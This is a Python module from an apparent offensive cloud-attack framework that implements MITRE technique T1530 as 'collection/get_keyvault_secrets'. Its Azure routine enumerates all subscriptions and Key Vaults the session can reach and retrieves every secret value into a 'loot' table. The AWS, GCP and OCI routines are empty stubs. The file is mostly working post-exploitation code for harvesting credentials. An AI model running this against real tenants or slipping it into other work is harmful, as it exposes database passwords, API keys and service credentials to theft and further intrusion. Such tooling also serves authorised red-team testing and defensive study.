# ================================================================
# TECHNIQUE: collection/get_keyvault_secrets
# ----------------------------------------------------------------
# TACTIC:    Collection (TA0009)
# TECHNIQUE: T1530 — Data from Cloud Storage (Applied to Secrets)
#
# PURPOSE:
#   Retrieve secret values from cloud secret management services.
#   These secrets often include database passwords, API keys,
#   and service account credentials.
#
# PROVIDERS: aws, azure, gcp, oci
#
# HOW IT WORKS (AZURE):
#   Requires Microsoft.KeyVault/vaults/secrets/read (Management)
#   AND Data Plane 'Get/List' permissions.
#   Iterates through vaults and attempts to list/get secret values.
#
# SAFE:      Yes
# ================================================================

from __future__ import annotations

import logging
from typing import Any

from quantum_mechanic.core.context import ExecutionContext
from quantum_mechanic.core.technique import Parameter, technique

logger = logging.getLogger(__name__)

# ----------------------------------------------------------------
# Loot schema — Declarative table mapping
# ----------------------------------------------------------------
LOOT_ITEMS_KEY = 'secrets'
LOOT_SCHEMA = [
    ('vault',          'Vault/Manager',   'bold cyan'),
    ('name',           'Secret Name',     'white'),
    ('value',          'Value',           'yellow'),
    ('content_type',   'Content Type',    'dim'),
]

@technique(
    technique_id='collection/get_keyvault_secrets',
    tactic='collection',
    mitre_id='T1530',
    providers=['aws', 'azure', 'gcp', 'oci'],
    severity='high',
    safe=True,
    description='Retrieve secrets from Key Vaults and Secret Managers.',
    loot_schema=LOOT_SCHEMA,
    loot_items_key=LOOT_ITEMS_KEY,
    parameters=[
        Parameter("target", "A specific vault or manager to search.", required=False),
        Parameter("secret_name", "A specific secret name to retrieve.", required=False),
    ]
)
def execute(ctx: ExecutionContext) -> dict[str, Any]:
    """Retrieve secrets from cloud managers."""
    if ctx.provider_name == 'aws':
        return _aws(ctx)
    if ctx.provider_name == 'azure':
        return _azure(ctx)
    if ctx.provider_name == 'gcp':
        return _gcp(ctx)
    if ctx.provider_name == 'oci':
        return _oci(ctx)

    return {"error": f"Provider {ctx.provider_name} not implemented.", "secrets": []}

def _aws(ctx: ExecutionContext) -> dict[str, Any]:
    # TODO: Implement AWS Secrets Manager retrieval
    return {"provider": "aws", "secrets": [], "note": "AWS implementation pending."}

def _azure(ctx: ExecutionContext) -> dict[str, Any]:
    """Retrieve Azure Key Vault secrets."""
    try:
        from azure.core.exceptions import ClientAuthenticationError, ResourceNotFoundError
        from azure.keyvault.secrets import SecretClient
        from azure.mgmt.keyvault import KeyVaultManagementClient
        from azure.mgmt.subscription import SubscriptionClient
    except ImportError:
        return {"error": "azure-mgmt-keyvault or azure-keyvault-secrets not installed.", "secrets": []}

    target = ctx.get_param("target")
    secret_name_param = ctx.get_param("secret_name")
    cred = ctx.session
    secrets = []

    # 1. Resolve which vaults to hit
    vault_uris = []
    try:
        if target:
            # If it's a URI already
            if target.startswith("https://") and ".vault.azure.net" in target:
                vault_uris.append((target.split("//")[1].split(".")[0], target))
            else:
                # Assume it's a name, we still need to find it to get the URI
                sub_client = SubscriptionClient(cred)
                for sub in sub_client.subscriptions.list():
                    try:
                        kv_client = KeyVaultManagementClient(cred, sub.subscription_id)
                        for vault in kv_client.vaults.list():
                            if vault.name == target:
                                full_vault = vault
                                if not getattr(vault, "properties", None) or not getattr(vault.properties, "vault_uri", None):
                                    try:
                                        rg = vault.id.split("/")[4]
                                        full_vault = kv_client.vaults.get(rg, vault.name)
                                    except Exception: pass

                                vault_uris.append((full_vault.name, full_vault.properties.vault_uri))
                                break
                    except Exception: continue
        else:
            # Discovery mode: list all in all subscriptions
            sub_client = SubscriptionClient(cred)
            for sub in sub_client.subscriptions.list():
                try:
                    kv_client = KeyVaultManagementClient(cred, sub.subscription_id)
                    for vault in kv_client.vaults.list():
                        full_vault = vault
                        if not getattr(vault, "properties", None) or not getattr(vault.properties, "vault_uri", None):
                            try:
                                rg = vault.id.split("/")[4]
                                full_vault = kv_client.vaults.get(rg, vault.name)
                            except Exception: pass

                        vault_uris.append((full_vault.name, full_vault.properties.vault_uri))
                except Exception as e:
                    ctx.warn(f"Failed to list vaults in sub {sub.subscription_id}: {e}")
    except Exception as e:
        return {"error": f"Discovery failed: {e}", "secrets": []}

    # 2. Iterate and retrieve
    for vault_name, vault_uri in vault_uris:
        ctx.info(f"Azure: Accessing vault {vault_name} ({vault_uri})...")
        try:
            client = SecretClient(vault_url=vault_uri, credential=cred)

            if secret_name_param:
                # Get specific secret
                try:
                    secret = client.get_secret(secret_name_param)
                    secrets.append({
                        "vault": vault_name,
                        "name": secret.name,
                        "value": secret.value,
                        "content_type": secret.properties.content_type or "Unknown"
                    })
                except ResourceNotFoundError:
                    ctx.warn(f"Secret {secret_name_param} not found in vault {vault_name}.")
                except ClientAuthenticationError:
                    ctx.warn(f"Access denied to secret {secret_name_param} in vault {vault_name}.")
            else:
                # List and attempt to get all
                try:
                    for secret_prop in client.list_properties_of_secrets():
                        try:
                            # We attempt to get the value for each secret listed
                            secret = client.get_secret(secret_prop.name)
                            secrets.append({
                                "vault": vault_name,
                                "name": secret.name,
                                "value": secret.value,
                                "content_type": secret.properties.content_type or "Unknown"
                            })
                        except ClientAuthenticationError:
                            # Can list but not get value
                            secrets.append({
                                "vault": vault_name,
                                "name": secret_prop.name,
                                "value": "[ACCESS DENIED]",
                                "content_type": secret_prop.content_type or "Unknown"
                            })
                except ClientAuthenticationError:
                    ctx.warn(f"Access denied listing secrets in vault {vault_name}.")

        except Exception as e:
            logger.debug("Failed to connect to vault %s: %s", vault_name, e)

    return {
        "provider": "azure",
        "secrets": secrets,
        "count": len(secrets)
    }

def _gcp(ctx: ExecutionContext) -> dict[str, Any]:
    # TODO: Implement GCP Secret Manager retrieval
    return {"provider": "gcp", "secrets": [], "note": "GCP implementation pending."}

def _oci(ctx: ExecutionContext) -> dict[str, Any]:
    # TODO: Implement OCI Vault retrieval
    return {"provider": "oci", "secrets": [], "note": "OCI implementation pending."}
